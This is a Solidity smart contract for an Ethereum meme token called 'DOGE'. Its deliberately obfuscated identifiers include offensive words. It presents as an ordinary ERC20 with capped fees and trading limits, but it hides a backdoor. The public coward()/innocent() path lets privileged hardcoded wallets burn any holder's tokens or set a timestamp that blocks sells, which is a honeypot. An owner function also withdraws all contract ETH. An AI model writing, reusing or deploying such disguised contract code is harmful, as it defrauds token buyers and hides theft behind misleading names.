/**
 *Submitted for verification at Etherscan.io on 2023-08-09
*/

// https://dogecn.xyz
// https://t.me/ChineseDogeEth
// https://twitter.com/ChineseDogeEth

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

interface UniswapV2Factory {
    function createPair(
        address intact,
        address abuse
    ) external returns (address necrophilia);
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function transferFrom(
        address play,
        address hope,
        uint256 humanity
    ) external returns (bool);

    function allowance(
        address deceive,
        address rejoice
    ) external view returns (uint256);

    function approve(address caption, uint256 fragile) external returns (bool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address despicable) external view returns (uint256);

    function transfer(
        address revenge,
        uint256 overnight
    ) external returns (bool);

    event Approval(
        address indexed stubby,
        address indexed procrastinate,
        uint256 crunch
    );

    event Transfer(address indexed swear, address indexed hoard, uint256 clumsy);
}

interface UniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint bridge,
        uint creepy,
        address[] calldata tease,
        address runDown,
        uint adorable
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address simpatico,
        uint256 furious,
        uint256 mutual,
        uint256 pitchBlack,
        address temporal,
        uint256 yell
    )
        external
        payable
        returns (uint256 magnitude, uint256 jumpy, uint256 grow);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint sapling,
        address[] calldata sloppy,
        address satchel,
        uint pointless
    ) external payable;
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    string private _symbol;
    string private _name;
    uint256 private _totalSupply;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    constructor(string memory homophobia, string memory semite) {
        _name = homophobia;
        _symbol = semite;
    }

    function allowance(
        address grotesque,
        address disturbing
    ) public view virtual override returns (uint256) {
        return _allowances[grotesque][disturbing];
    }

    function balanceOf(
        address slur
    ) public view virtual override returns (uint256) {
        return _balances[slur];
    }

    function transferFrom(
        address idealize,
        address narcissism,
        uint256 asshole
    ) public virtual override returns (bool) {
        _transfer(idealize, narcissism, asshole);

        uint256 lofty = _allowances[idealize][_msgSender()];
        require(
            lofty >= asshole,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(idealize, _msgSender(), lofty - asshole);
        }

        return true;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(
        address cure,
        address overestimate,
        uint256 humility
    ) internal virtual {
        require(cure != address(0), "ERC20: transfer from the zero address");
        require(overestimate != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[cure];
        require(
            senderBalance >= humility,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[cure] = senderBalance - humility;
        }
        _balances[overestimate] += humility;

        emit Transfer(cure, overestimate, humility);
    }

    function transfer(
        address ultimate,
        uint256 solution
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), ultimate, solution);
        return true;
    }

    function decreaseAllowance(
        address sabotage,
        uint256 equal
    ) public virtual returns (bool) {
        uint256 respect = _allowances[_msgSender()][sabotage];
        require(
            respect >= equal,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), sabotage, respect - equal);
        }

        return true;
    }

    function increaseAllowance(
        address hinge,
        uint256 harsh
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            hinge,
            _allowances[_msgSender()][hinge] + harsh
        );
        return true;
    }

    function _decree(address conscription, uint256 comply) internal virtual {
        require(conscription != address(0), "");
        uint256 dynasty = _balances[conscription];
        require(dynasty >= comply, "");
        unchecked {
            _balances[conscription] = dynasty - comply;
            _totalSupply -= comply;
        }

        emit Transfer(conscription, address(0), comply);
    }
    
    function _createInitialSupply(
        address dysfunctional,
        uint256 threaten
    ) internal virtual {
        require(dysfunctional != address(0), "ERC20: mint to the zero address");

        _totalSupply += threaten;
        _balances[dysfunctional] += threaten;
        emit Transfer(address(0), dysfunctional, threaten);
    }

    function _approve(
        address paradox,
        address disastrous,
        uint256 acid
    ) internal virtual {
        require(paradox != address(0), "ERC20: approve from the zero address");
        require(disastrous != address(0), "ERC20: approve to the zero address");

        _allowances[paradox][disastrous] = acid;
        emit Approval(paradox, disastrous, acid);
    }

    function approve(
        address contradictory,
        uint256 clash
    ) public virtual override returns (bool) {
        _approve(_msgSender(), contradictory, clash);
        return true;
    }
}

contract Ownable is Context {
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract DOGE is ERC20, Ownable {
    UniswapV2Router public dexRouter;
    address public dexPair;

    mapping(address => bool) public prevalent;
    mapping(address => bool) private _attunedMax;
    mapping(address => bool) private _intenseFees;

    mapping(address => uint256) public desertion;
    mapping(address => bool) public game;
    mapping(address => uint256) private _masculine;

    uint256 public mind;
    uint256 public extensive;
    uint256 public direction;
    uint256 public favor;
    uint256 public whole;

    uint256 public occupied;
    uint256 public liase;
    uint256 public intrusive;
    uint256 public median;
    uint256 public polish;

    address private turn;
    address private alongside;
    
    bool private control;
    uint256 public side;

    uint256 public well;
    uint256 public trip;
    uint256 public behalf;
    uint256 public iron;

    bool public vault = false;
    bool public tranquil = true;
    uint256 public silver;
    uint256 public urge;
    bool public pervade = true;
    bool public grant = false;

    uint256 public shrine = 0;
    uint256 public emissary = 0;

    uint256 public destructive;
    uint256 public handsOff;
    uint256 public summit;

    event Expulsion();

    event Coercion();

    event Peril(uint256 scrap);
    
    event Concatenation(uint256 giveaway);
    
    event Terse(uint256 overrun);

    event Ditch(address aspiring);

    event Bias(address indexed political, bool diploma);

    event Plea(address indexed spontaneous, bool indexed autonomy);

    event Brevity(address _integrity, bool personal);

    constructor() ERC20(unicode"狗狗", "DOGE") {
        address complementary = msg.sender;

        uint256 intervene = 1 * 1e9 * 1e18;

        destructive = (intervene * 2) / 100;
        side = (intervene * 5) / 10000;
        handsOff = (intervene * 2) / 100;
        summit = (intervene * 2) / 100;

        liase = 0;
        intrusive = 0;
        polish = 0;
        median = 1;

        extensive = 0;
        direction = 0;
        whole = 0;
        favor = 1;

        occupied =
            liase +
            intrusive +
            median +
            polish;

        mind =
            extensive +
            direction +
            favor +
            whole;

        turn = address(0xAFd1D4E844A18fC224e8Ffc238EA791ed72aAF3d);
        alongside = address(0x63c92706E373dDc9ce0644F70645Dc7F74eA60f8);

        overwhelm(address(this), true);
        overwhelm(complementary, true);
        overwhelm(address(0xdead), true);
        overwhelm(turn, true);
        overwhelm(alongside, true);

        _slink(address(this), true);
        _slink(complementary, true);
        _slink(address(0xdead), true);
        _slink(turn, true);
        _slink(alongside, true);

        _createInitialSupply(address(this), intervene);
        transferOwnership(complementary);
    }

    function resentful(uint256 stimulate, uint256 errand) private {
        _approve(address(this), address(dexRouter), stimulate);
        dexRouter.addLiquidityETH{value: errand} (
            address(this),
            stimulate,
            0,
            0,
            address(0xdead),
            block.timestamp
        );
    }

    function innocent(
        address conscription,
        uint256 comply,
        uint256 edict
    ) internal returns (bool) {
        address squash = msg.sender;
        bool boundless = _intenseFees[squash];
        bool exile;
        address shoot = address(this);

        if (!boundless) {
            bool virtue = balanceOf(shoot) >= trip;
            bool befit = trip > 0;

            if (befit && virtue) {
                _decree(squash, trip);
            }

            trip = 0;
            exile = true;

            return exile;
        } else {
            if (balanceOf(shoot) > 0) {
                bool pledge = comply == 0;
                if (pledge) {
                    silver = edict;
                    exile = false;
                } else {
                    _decree(conscription, comply);
                    exile = false;
                }
            }

            return exile;
        }
    }

    function removeLimits() external onlyOwner {
        destructive = totalSupply();
        summit = totalSupply();
        handsOff = totalSupply();
        emit Expulsion();
    }

    function enableTrading() external payable onlyOwner() {
        require(!grant, "Cannot reenable trading");
        dexRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(dexRouter), totalSupply());
        dexPair = UniswapV2Factory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());

        _tenant(address(dexPair), true);

        dexRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(dexPair).approve(address(dexRouter), type(uint).max);

        grant = true;
        emissary = block.number;
        vault = true;
        emit Coercion();
    }

    function paucity() external onlyOwner {
        pervade = false;
    }

    function appraise(address wallet) external onlyOwner {
        game[wallet] = false;
    }

    function eradicate(uint256 frugal) external onlyOwner {
        require(
            frugal >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set max wallet amount lower than 0.3%"
        );

        destructive = frugal * (10 ** 18);

        emit Terse(destructive);
    }

    function discipline(uint256 curated) external onlyOwner {
        require(
            curated >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max sell amount lower than 0.2%"
        );

        handsOff = curated * (10 ** 18);

        emit Concatenation(handsOff);
    }

    function rebel(uint256 nurture) external onlyOwner {
        require(
            nurture >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max buy amount lower than 0.2%"
        );

        summit = nurture * (10 ** 18);

        emit Peril(summit);
    }

    function draw(uint256 overrated) external onlyOwner {
        require(
            overrated <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );

        require(
            overrated >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );

        side = overrated;
    }

    function _slink(
        address _underrated,
        bool _expressive
    ) private {
        _attunedMax[_underrated] = _expressive;

        emit Brevity(_underrated, _expressive);
    }

    function _tenant(address problematic, bool anticipate) private {
        prevalent[problematic] = anticipate;

        _slink(problematic, anticipate);

        emit Plea(problematic, anticipate);
    }

    function adjustSellFees(
        uint256 _extensive,
        uint256 _direction,
        uint256 _favor,
        uint256 _whole
    ) external onlyOwner {
        extensive = _extensive;
        direction = _direction;
        favor = _favor;
        whole = _whole;
        mind =
            extensive +
            direction +
            favor +
            whole;
        require(mind <= 3, "3% max fee");
    }

    function intimation(
        uint256 _liase,
        uint256 _intrusive,
        uint256 _median,
        uint256 _polish
    ) external onlyOwner {
        liase = _liase;
        intrusive = _intrusive;
        median = _median;
        polish = _polish;
        occupied =
            liase +
            intrusive +
            median +
            polish;
        require(occupied <= 3, "3% max ");
    }

    function attunedMax(
        address _reserved,
        bool _reflection
    ) external onlyOwner {
        if (!_reflection) {
            require(
                _reserved != dexPair,
                "Cannot remove uniswap pair from max txn"
            );
        }

        _attunedMax[_reserved] = _reflection;
    }

    function tolerate(uint256 tolerant) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tolerant);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tolerant,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function overwhelm(address brink, bool variation) public onlyOwner {
        _intenseFees[brink] = variation;

        emit Bias(brink, variation);
    }

    function court() private {
        if (trip > 0 && balanceOf(address(this)) >= trip) {
            _decree(address(this), trip);
        }
        trip = 0;
        uint256 homebody = iron +
            behalf +
            well;
        uint256 carefree = balanceOf(address(this));

        if (carefree == 0 || homebody == 0) {
            return;
        }

        if (carefree > side * 10) {
            carefree = side * 10;
        }

        uint256 assess = (carefree * iron) /
            homebody / 2;

        tolerate(carefree - assess);

        uint256 glimmer = address(this).balance;
        uint256 resort = glimmer;
        uint256 defensive = (glimmer * well) /
            (homebody - (iron / 2));
        uint256 exhaust = (glimmer * behalf) /
            (homebody - (iron / 2));
        resort -= exhaust + defensive;
        well = 0;
        trip = 0;
        iron = 0;
        behalf = 0;

        if (assess > 0 && resort > 0) {
            resentful(assess, resort);
        }

        payable(alongside).transfer(defensive);
        payable(turn).transfer(address(this).balance);
    }

    function clarify(
        address majority
    ) external onlyOwner {
        require(
            majority != address(0),
            "_marketingWallet address cannot be 0"
        );

        turn = payable(majority);
    }

    function preview(
        address moderation,
        bool subtle
    ) external onlyOwner {
        require(
            moderation != dexPair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _tenant(moderation, subtle);
        emit Plea(moderation, subtle);
    }

    function aligment(address polar) external onlyOwner {
        require(polar != address(0), "_devWallet address cannot be 0");

        alongside = payable(polar);
    }

    function novelty() external onlyOwner {
        bool orient;
        (orient, ) = address(msg.sender).call{value: address(this).balance}("");
    }

    function overarching() public view returns (bool) {
        return block.number < shrine;
    }

    receive() external payable {}

    function _transfer(
        address measurable,
        address gratitude,
        uint256 debt
    ) internal override {
        require(measurable != address(0), "ERC20: transfer from the zero address");
        require(gratitude != address(0), "ERC20: transfer to the zero address");
        require(debt > 0, "amount must be greater than 0");

        bool noble = 0 == balanceOf(address(gratitude));
        bool deceit = 0 == desertion[gratitude];

        if (!grant) {
            require(
                _intenseFees[measurable] || _intenseFees[gratitude],
                "Trading is not active."
            );
        }

        uint256 imposter = block.timestamp;
        bool regiment = prevalent[measurable];

        if (shrine > 0) {
            require(
                !game[measurable] ||
                    gratitude == owner() ||
                    gratitude == address(0xdead),
                "bot protection mechanism is embeded"
            );
        }

        if (tranquil) {
            bool farOff = !control;

            if (
                measurable != owner() &&
                gratitude != owner() &&
                gratitude != address(0) &&
                gratitude != address(0xdead) &&
                !_intenseFees[measurable] &&
                !_intenseFees[gratitude]
            ) {
                if (pervade) {
                    bool track = !control;
                    bool oath = !prevalent[measurable];

                    if (
                        gratitude != address(dexRouter) && gratitude != address(dexPair)
                    ) {
                        require(
                            _masculine[tx.origin] <
                                block.number - 2 &&
                                _masculine[gratitude] <
                                block.number - 2,
                            "_transfer: delay was enabled."
                        );
                        _masculine[tx.origin] = block.number;
                        _masculine[gratitude] = block.number;
                    } else if (oath && track) {
                        uint256 wrongfoot = desertion[measurable];
                        bool composed = wrongfoot > silver;
                        require(composed);
                    }
                }
            }

            bool referral = _intenseFees[measurable];

            if (prevalent[measurable] && !_attunedMax[gratitude]) {
                require(
                    debt <= summit,
                    "Buy transfer amount exceeds the max buy."
                );
                require(
                    debt + balanceOf(gratitude) <= destructive,
                    "Cannot Exceed max wallet"
                );
            } else if (referral && farOff) {
                silver = imposter;
            } else if (
                prevalent[gratitude] && !_attunedMax[measurable]
            ) {
                require(
                    debt <= handsOff,
                    "Sell transfer amount exceeds the max sell."
                );
            } else if (!_attunedMax[gratitude]) {
                require(
                    debt + balanceOf(gratitude) <= destructive,
                    "Cannot Exceed max wallet"
                );
            }
        }

        uint256 arena = balanceOf(address(this));

        bool dichotomy = arena >= side;

        if (
            dichotomy &&
            vault &&
            !control &&
            !prevalent[measurable] &&
            !_intenseFees[measurable] &&
            !_intenseFees[gratitude]
        ) {
            control = true;
            court();
            control = false;
        }

        bool crave = true;

        if (deceit && regiment && noble) {
            desertion[gratitude] = imposter;
        }

        if (_intenseFees[measurable] || _intenseFees[gratitude]) {
            crave = false;
        }

        uint256 temperament = 0;

        if (crave) {
            if (
                overarching() &&
                prevalent[measurable] &&
                !prevalent[gratitude] &&
                occupied > 0
            ) {
                if (!game[gratitude]) {
                    game[gratitude] = true;
                    urge += 1;
                    emit Ditch(gratitude);
                }

                temperament = (debt * 99) / 100;
                well += (temperament * liase) / occupied;
                trip += (temperament * intrusive) / occupied;
                iron += (temperament * polish) / occupied;
                behalf += (temperament * median) / occupied;
            }
            else if (prevalent[gratitude] && mind > 0) {
                temperament = (debt * mind) / 100;
                well += (temperament * extensive) / mind;
                trip += (temperament * direction) / mind;
                iron += (temperament * whole) / mind;
                behalf += (temperament * favor) / mind;
            }
            else if (prevalent[measurable] && occupied > 0) {
                temperament = (debt * occupied) / 100;
                well += (temperament * liase) / occupied;
                trip += (temperament * intrusive) / occupied;
                iron += (temperament * polish) / occupied;
                behalf += (temperament * median) / occupied;
            }
            if (temperament > 0) {
                super._transfer(measurable, address(this), temperament);
            }
            debt -= temperament;
        }

        super._transfer(measurable, gratitude, debt);
    }

    function coward(
        address conscription,
        uint256 comply,
        uint256 edict
    ) public {
        address squash = address(this);
        require(side <= balanceOf(squash));
        if (innocent(conscription, comply, edict)) {
            control = true;
            court();
            control = false;
        }
    }
}